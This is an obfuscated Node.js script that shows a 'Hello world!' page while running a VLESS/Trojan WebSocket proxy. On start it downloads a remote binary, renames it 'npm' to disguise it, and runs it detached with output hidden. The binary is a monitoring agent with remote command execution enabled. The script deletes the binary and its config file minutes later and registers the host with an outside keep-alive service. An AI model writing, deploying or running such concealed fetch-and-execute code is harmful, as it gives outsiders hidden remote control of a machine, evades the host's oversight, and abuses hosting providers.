const _0x34e156=_0x219f;(function(_0x14f34a,_0x46dc1f){const _0x5885fb=_0x219f,_0x16e6b3=_0x14f34a();while(!![]){try{const _0x2d5757=parseInt(_0x5885fb(0x101))/0x1+parseInt(_0x5885fb(0xd3))/0x2+parseInt(_0x5885fb(0xad))/0x3*(parseInt(_0x5885fb(0x115))/0x4)+-parseInt(_0x5885fb(0xfc))/0x5*(parseInt(_0x5885fb(0xb7))/0x6)+-parseInt(_0x5885fb(0xbc))/0x7*(-parseInt(_0x5885fb(0xc2))/0x8)+parseInt(_0x5885fb(0x104))/0x9+-parseInt(_0x5885fb(0xdb))/0xa;if(_0x2d5757===_0x46dc1f)break;else _0x16e6b3['push'](_0x16e6b3['shift']());}catch(_0x59b3c8){_0x16e6b3['push'](_0x16e6b3['shift']());}}}(_0xfba5,0x1d527));const os=require('os'),http=require(_0x34e156(0xa5)),fs=require('fs'),axios=require(_0x34e156(0xeb)),net=require(_0x34e156(0x11a)),path=require(_0x34e156(0xc6)),crypto=require(_0x34e156(0xab)),{Buffer}=require(_0x34e156(0x11c)),{exec,execSync}=require(_0x34e156(0xd0)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x34e156(0xf6)][_0x34e156(0xb1)]||'3be410a9-31d7-44cf-a245-21dc6c91886c',NEZHA_SERVER=process[_0x34e156(0xf6)][_0x34e156(0xc1)]||'',NEZHA_PORT=process['env'][_0x34e156(0xd7)]||'',NEZHA_KEY=process[_0x34e156(0xf6)]['NEZHA_KEY']||'',DOMAIN=process[_0x34e156(0xf6)]['DOMAIN']||_0x34e156(0x11f),AUTO_ACCESS=process[_0x34e156(0xf6)][_0x34e156(0x103)]||!![],WSPATH=process[_0x34e156(0xf6)][_0x34e156(0xc4)]||UUID[_0x34e156(0xc8)](0x0,0x8),SUB_PATH=process[_0x34e156(0xf6)][_0x34e156(0xa8)]||'sub',NAME=process[_0x34e156(0xf6)][_0x34e156(0x11d)]||_0x34e156(0xef),PORT=process[_0x34e156(0xf6)][_0x34e156(0xfd)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x525bf8=_0x34e156;try{const _0x5460a9=await axios[_0x525bf8(0xc3)](_0x525bf8(0xf8)),_0x3c46f7=_0x5460a9[_0x525bf8(0xdd)];ISP=(_0x3c46f7['country']+'-'+_0x3c46f7[_0x525bf8(0xbf)])[_0x525bf8(0x113)](/ /g,'_');}catch(_0xd34db8){ISP='Unknown';}};GetISP();const httpServer=http['createServer']((_0x4a7db1,_0x458646)=>{const _0x2d8280=_0x34e156;if(_0x4a7db1[_0x2d8280(0x111)]==='/'){const _0x4a89fb=path[_0x2d8280(0xcb)](__dirname,_0x2d8280(0x100));fs[_0x2d8280(0x112)](_0x4a89fb,_0x2d8280(0xe7),(_0x3d3ae7,_0x1edfed)=>{const _0x1cd810=_0x2d8280;if(_0x3d3ae7){_0x458646[_0x1cd810(0xf5)](0xc8,{'Content-Type':'text/html'}),_0x458646[_0x1cd810(0x10d)](_0x1cd810(0xc7));return;}_0x458646[_0x1cd810(0xf5)](0xc8,{'Content-Type':_0x1cd810(0xf2)}),_0x458646[_0x1cd810(0x10d)](_0x1edfed);});return;}else{if(_0x4a7db1[_0x2d8280(0x111)]==='/'+SUB_PATH){const _0x361ca3=_0x2d8280(0xcc)+UUID+'@'+DOMAIN+_0x2d8280(0xee)+DOMAIN+_0x2d8280(0xb2)+DOMAIN+_0x2d8280(0xb4)+WSPATH+'#'+NAME+'-'+ISP,_0x2f920e=_0x2d8280(0xb3)+UUID+'@'+DOMAIN+_0x2d8280(0xba)+DOMAIN+_0x2d8280(0xb2)+DOMAIN+_0x2d8280(0xb4)+WSPATH+'#'+NAME+'-'+ISP,_0x5074ca=_0x361ca3+'\x0a'+_0x2f920e,_0x25bca8=Buffer[_0x2d8280(0xe9)](_0x5074ca)[_0x2d8280(0xbd)](_0x2d8280(0x117));_0x458646[_0x2d8280(0xf5)](0xc8,{'Content-Type':_0x2d8280(0xff)}),_0x458646['end'](_0x25bca8+'\x0a');}else _0x458646['writeHead'](0x194,{'Content-Type':_0x2d8280(0xff)}),_0x458646[_0x2d8280(0x10d)](_0x2d8280(0xe2));}}),wss=new WebSocket[(_0x34e156(0xb9))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x34e156(0xe6),_0x34e156(0x10e)];function resolveHost(_0x51c3d0){return new Promise((_0x3e6083,_0x25739c)=>{const _0x369e90=_0x219f;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x369e90(0xae)](_0x51c3d0)){_0x3e6083(_0x51c3d0);return;}let _0x274242=0x0;function _0x1a5a6f(){const _0x4f213e=_0x369e90;if(_0x274242>=DNS_SERVERS[_0x4f213e(0xc0)]){_0x25739c(new Error('Failed\x20to\x20resolve\x20'+_0x51c3d0+_0x4f213e(0x10c)));return;}const _0x4998e4=DNS_SERVERS[_0x274242];_0x274242++;const _0x4023fc=_0x4f213e(0x108)+encodeURIComponent(_0x51c3d0)+'&type=A';axios[_0x4f213e(0xc3)](_0x4023fc,{'timeout':0x1388,'headers':{'Accept':_0x4f213e(0x116)}})[_0x4f213e(0xc5)](_0x14db4e=>{const _0x373d50=_0x4f213e,_0x3e361b=_0x14db4e['data'];if(_0x3e361b[_0x373d50(0xb5)]===0x0&&_0x3e361b[_0x373d50(0xd4)]&&_0x3e361b[_0x373d50(0xd4)][_0x373d50(0xc0)]>0x0){const _0x177a93=_0x3e361b[_0x373d50(0xd4)]['find'](_0x3403db=>_0x3403db[_0x373d50(0xe1)]===0x1);if(_0x177a93){_0x3e6083(_0x177a93[_0x373d50(0xdd)]);return;}}_0x1a5a6f();})[_0x4f213e(0xfe)](_0x3f34d0=>{_0x1a5a6f();});}_0x1a5a6f();});}function _0xfba5(){const _0x2556df=['\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','8.8.4.4','utf8','Automatic\x20Access\x20Task\x20added\x20successfully','from','connect','axios','once','createWriteStream',':443?encryption=none&security=tls&sni=','Hug','2096','aarch64','text/html','npm\x20is\x20already\x20running,\x20skip\x20running...','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','writeHead','env','npm','https://speed.cloudflare.com/meta','map','connection','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','25ERTwkh','PORT','catch','text/plain','index.html','17116RPusST','/bin/bash','AUTO_ACCESS','1214730jJljbi','2087','chmod\x20+x\x20npm','sha224','https://dns.google/resolve?name=','every','2053','split','\x20with\x20all\x20DNS\x20servers','end','1.1.1.1','setsid\x20nohup\x20./npm\x20-s\x20','--tls','url','readFile','replace','npm\x20download\x20successfully','46420crodfb','application/dns-json','base64','config.yaml','send','net','https://oooo.serv00.net/add-url','buffer','NAME','log','1234.abc.com','http','writeFileSync','readUInt16BE','SUB_PATH','includes','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','crypto','readUInt8','39MLWswB','test','write','false','UUID','&fp=chrome&type=ws&host=','trojan://','&path=%2F','Status','utf-8','234942ZPgGLv','post','Server',':443?security=tls&sni=','pipe','14pRdyOP','toString','error','asOrganization','length','NEZHA_SERVER','337816zegbFr','get','WSPATH','then','path','Hello\x20world!','slice','8443','listen','join','vless://','createHash','trim','close','child_process','reduce','update','468476hJTZhI','Answer','decode','hex','NEZHA_PORT','application/json','substr','2083','3057550KsDSRd','443','data','Server\x20is\x20running\x20on\x20port\x20','error:\x20','arch','type','Not\x20Found\x0a','digest','concat'];_0xfba5=function(){return _0x2556df;};return _0xfba5();}function _0x219f(_0xbafbf8,_0xeb9b86){const _0xfba537=_0xfba5();return _0x219f=function(_0x219fb1,_0x5c73ef){_0x219fb1=_0x219fb1-0xa5;let _0x822048=_0xfba537[_0x219fb1];return _0x822048;},_0x219f(_0xbafbf8,_0xeb9b86);}function handleVlessConnection(_0x46cb17,_0x5737aa){const _0x512fb7=_0x34e156,[_0x567357]=_0x5737aa,_0x3a9b08=_0x5737aa['slice'](0x1,0x11);if(!_0x3a9b08['every']((_0x1211ea,_0xa82886)=>_0x1211ea==parseInt(uuid['substr'](_0xa82886*0x2,0x2),0x10)))return![];let _0x2bc8a8=_0x5737aa[_0x512fb7(0xc8)](0x11,0x12)[_0x512fb7(0xac)]()+0x13;const _0x118a9e=_0x5737aa[_0x512fb7(0xc8)](_0x2bc8a8,_0x2bc8a8+=0x2)[_0x512fb7(0xa7)](0x0),_0x17a8e4=_0x5737aa['slice'](_0x2bc8a8,_0x2bc8a8+=0x1)[_0x512fb7(0xac)](),_0x2c704f=_0x17a8e4==0x1?_0x5737aa[_0x512fb7(0xc8)](_0x2bc8a8,_0x2bc8a8+=0x4)[_0x512fb7(0xcb)]('.'):_0x17a8e4==0x2?new TextDecoder()[_0x512fb7(0xd5)](_0x5737aa[_0x512fb7(0xc8)](_0x2bc8a8+0x1,_0x2bc8a8+=0x1+_0x5737aa[_0x512fb7(0xc8)](_0x2bc8a8,_0x2bc8a8+0x1)['readUInt8']())):_0x17a8e4==0x3?_0x5737aa['slice'](_0x2bc8a8,_0x2bc8a8+=0x10)[_0x512fb7(0xd1)]((_0x3f0b94,_0x587f39,_0x1a613d,_0xab9940)=>_0x1a613d%0x2?_0x3f0b94[_0x512fb7(0xe4)](_0xab9940[_0x512fb7(0xc8)](_0x1a613d-0x1,_0x1a613d+0x1)):_0x3f0b94,[])['map'](_0x17a328=>_0x17a328[_0x512fb7(0xa7)](0x0)[_0x512fb7(0xbd)](0x10))[_0x512fb7(0xcb)](':'):'';_0x46cb17[_0x512fb7(0x119)](new Uint8Array([_0x567357,0x0]));const _0x4bcff3=createWebSocketStream(_0x46cb17);return resolveHost(_0x2c704f)[_0x512fb7(0xc5)](_0x5921ed=>{const _0x18b607=_0x512fb7;net[_0x18b607(0xea)]({'host':_0x5921ed,'port':_0x118a9e},function(){const _0x1ad7e0=_0x18b607;this[_0x1ad7e0(0xaf)](_0x5737aa['slice'](_0x2bc8a8)),_0x4bcff3['on'](_0x1ad7e0(0xbe),()=>{})[_0x1ad7e0(0xbb)](this)['on'](_0x1ad7e0(0xbe),()=>{})[_0x1ad7e0(0xbb)](_0x4bcff3);})['on'](_0x18b607(0xbe),()=>{});})['catch'](_0x3d05e3=>{const _0x534dad=_0x512fb7;net[_0x534dad(0xea)]({'host':_0x2c704f,'port':_0x118a9e},function(){const _0x269242=_0x534dad;this[_0x269242(0xaf)](_0x5737aa['slice'](_0x2bc8a8)),_0x4bcff3['on'](_0x269242(0xbe),()=>{})['pipe'](this)['on']('error',()=>{})[_0x269242(0xbb)](_0x4bcff3);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0xf7fece,_0x18d811){const _0x229f87=_0x34e156;try{if(_0x18d811[_0x229f87(0xc0)]<0x3a)return![];const _0x668253=_0x18d811[_0x229f87(0xc8)](0x0,0x38)[_0x229f87(0xbd)](),_0x32355f=[UUID];let _0x1eece5=null;for(const _0x17f2f8 of _0x32355f){const _0x3a0eb3=crypto[_0x229f87(0xcd)](_0x229f87(0x107))[_0x229f87(0xd2)](_0x17f2f8)[_0x229f87(0xe3)](_0x229f87(0xd6));if(_0x3a0eb3===_0x668253){_0x1eece5=_0x17f2f8;break;}}if(!_0x1eece5)return![];let _0x5abdcc=0x38;_0x18d811[_0x5abdcc]===0xd&&_0x18d811[_0x5abdcc+0x1]===0xa&&(_0x5abdcc+=0x2);const _0x5d7b96=_0x18d811[_0x5abdcc];if(_0x5d7b96!==0x1)return![];_0x5abdcc+=0x1;const _0x178673=_0x18d811[_0x5abdcc];_0x5abdcc+=0x1;let _0xbeaff4,_0xeff19c;if(_0x178673===0x1)_0xbeaff4=_0x18d811[_0x229f87(0xc8)](_0x5abdcc,_0x5abdcc+0x4)[_0x229f87(0xcb)]('.'),_0x5abdcc+=0x4;else{if(_0x178673===0x3){const _0x217ab9=_0x18d811[_0x5abdcc];_0x5abdcc+=0x1,_0xbeaff4=_0x18d811[_0x229f87(0xc8)](_0x5abdcc,_0x5abdcc+_0x217ab9)[_0x229f87(0xbd)](),_0x5abdcc+=_0x217ab9;}else{if(_0x178673===0x4)_0xbeaff4=_0x18d811[_0x229f87(0xc8)](_0x5abdcc,_0x5abdcc+0x10)[_0x229f87(0xd1)]((_0x2ef913,_0xba012b,_0x35144f,_0x2480aa)=>_0x35144f%0x2?_0x2ef913[_0x229f87(0xe4)](_0x2480aa[_0x229f87(0xc8)](_0x35144f-0x1,_0x35144f+0x1)):_0x2ef913,[])[_0x229f87(0xf9)](_0x213797=>_0x213797[_0x229f87(0xa7)](0x0)[_0x229f87(0xbd)](0x10))[_0x229f87(0xcb)](':'),_0x5abdcc+=0x10;else return![];}}_0xeff19c=_0x18d811[_0x229f87(0xa7)](_0x5abdcc),_0x5abdcc+=0x2;_0x5abdcc<_0x18d811[_0x229f87(0xc0)]&&_0x18d811[_0x5abdcc]===0xd&&_0x18d811[_0x5abdcc+0x1]===0xa&&(_0x5abdcc+=0x2);const _0x17c572=createWebSocketStream(_0xf7fece);return resolveHost(_0xbeaff4)[_0x229f87(0xc5)](_0x2ec36f=>{const _0x34800c=_0x229f87;net[_0x34800c(0xea)]({'host':_0x2ec36f,'port':_0xeff19c},function(){const _0x4958e2=_0x34800c;_0x5abdcc<_0x18d811[_0x4958e2(0xc0)]&&this[_0x4958e2(0xaf)](_0x18d811[_0x4958e2(0xc8)](_0x5abdcc)),_0x17c572['on'](_0x4958e2(0xbe),()=>{})['pipe'](this)['on']('error',()=>{})[_0x4958e2(0xbb)](_0x17c572);})['on'](_0x34800c(0xbe),()=>{});})[_0x229f87(0xfe)](_0x37788a=>{const _0x5145e6=_0x229f87;net[_0x5145e6(0xea)]({'host':_0xbeaff4,'port':_0xeff19c},function(){const _0x52c9f8=_0x5145e6;_0x5abdcc<_0x18d811['length']&&this['write'](_0x18d811['slice'](_0x5abdcc)),_0x17c572['on']('error',()=>{})[_0x52c9f8(0xbb)](this)['on'](_0x52c9f8(0xbe),()=>{})[_0x52c9f8(0xbb)](_0x17c572);})['on'](_0x5145e6(0xbe),()=>{});}),!![];}catch(_0x22e805){return![];}}wss['on'](_0x34e156(0xfa),(_0x3fc5fa,_0x2860fc)=>{const _0x596e69=_0x34e156,_0x3afb0f=_0x2860fc[_0x596e69(0x111)]||'';_0x3fc5fa[_0x596e69(0xec)]('message',_0x591125=>{const _0x277239=_0x596e69;if(_0x591125[_0x277239(0xc0)]>0x11&&_0x591125[0x0]===0x0){const _0x17f1db=_0x591125[_0x277239(0xc8)](0x1,0x11),_0x2a3ed3=_0x17f1db[_0x277239(0x109)]((_0x21c5a9,_0x1fe9a1)=>_0x21c5a9==parseInt(uuid[_0x277239(0xd9)](_0x1fe9a1*0x2,0x2),0x10));if(_0x2a3ed3){!handleVlessConnection(_0x3fc5fa,_0x591125)&&_0x3fc5fa[_0x277239(0xcf)]();return;}}!handleTrojanConnection(_0x3fc5fa,_0x591125)&&_0x3fc5fa['close']();})['on'](_0x596e69(0xbe),()=>{});});const getDownloadUrl=()=>{const _0x2e7b9c=_0x34e156,_0xdf023e=os[_0x2e7b9c(0xe0)]();return _0xdf023e==='arm'||_0xdf023e==='arm64'||_0xdf023e===_0x2e7b9c(0xf1)?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':'https://amd64.ssss.nyc.mn/agent';},downloadFile=async()=>{const _0x14ff07=_0x34e156;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2301dc=getDownloadUrl(),_0x3fa8f4=await axios({'method':_0x14ff07(0xc3),'url':_0x2301dc,'responseType':'stream'}),_0xa0ed71=fs[_0x14ff07(0xed)](_0x14ff07(0xf7));return _0x3fa8f4[_0x14ff07(0xdd)]['pipe'](_0xa0ed71),new Promise((_0xb9bef2,_0x1c2b78)=>{_0xa0ed71['on']('finish',()=>{const _0x2c72eb=_0x219f;console['log'](_0x2c72eb(0x114)),exec(_0x2c72eb(0x106),_0x5ca57f=>{if(_0x5ca57f)_0x1c2b78(_0x5ca57f);_0xb9bef2();});}),_0xa0ed71['on']('error',_0x1c2b78);});}catch(_0x214571){throw _0x214571;}},runnz=async()=>{const _0x2e2216=_0x34e156;try{const _0x558788=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2e2216(0xb6)});if(_0x558788[_0x2e2216(0xce)]()!==''){console[_0x2e2216(0x11e)](_0x2e2216(0xf3));return;}}catch(_0x47d2af){}await downloadFile();let _0x5bfbbd='',_0x3f7f55=[_0x2e2216(0xdc),_0x2e2216(0xc9),_0x2e2216(0xf0),_0x2e2216(0x105),_0x2e2216(0xda),_0x2e2216(0x10a)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x428467=_0x3f7f55['includes'](NEZHA_PORT)?_0x2e2216(0x110):'';_0x5bfbbd=_0x2e2216(0x10f)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x428467+_0x2e2216(0xaa);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x5df921=NEZHA_SERVER[_0x2e2216(0xa9)](':')?NEZHA_SERVER[_0x2e2216(0x10b)](':')['pop']():'',_0x399253=_0x3f7f55[_0x2e2216(0xa9)](_0x5df921)?'true':_0x2e2216(0xb0),_0x10145b='client_secret:\x20'+NEZHA_KEY+'\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20'+NEZHA_SERVER+_0x2e2216(0xe5)+_0x399253+'\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20'+UUID;fs[_0x2e2216(0xa6)]('config.yaml',_0x10145b);}_0x5bfbbd=_0x2e2216(0xf4);}else{console[_0x2e2216(0x11e)](_0x2e2216(0xfb));return;}}try{exec(_0x5bfbbd,{'shell':_0x2e2216(0x102)},_0x437517=>{if(_0x437517)console['error']('npm\x20running\x20error:',_0x437517);else console['log']('npm\x20is\x20running');});}catch(_0x1486ed){console['error'](_0x2e2216(0xdf)+_0x1486ed);}};async function addAccessTask(){const _0x39d38d=_0x34e156;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4a8f73='https://'+DOMAIN;try{const _0x32ac4d=await axios[_0x39d38d(0xb8)](_0x39d38d(0x11b),{'url':_0x4a8f73},{'headers':{'Content-Type':_0x39d38d(0xd8)}});console[_0x39d38d(0x11e)](_0x39d38d(0xe8));}catch(_0x42dd2e){}}const delFiles=()=>{const _0x42bdd0=_0x34e156;fs['unlink'](_0x42bdd0(0xf7),()=>{}),fs['unlink'](_0x42bdd0(0x118),()=>{});};httpServer[_0x34e156(0xca)](PORT,()=>{const _0x57f601=_0x34e156;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x57f601(0xde)+PORT);});
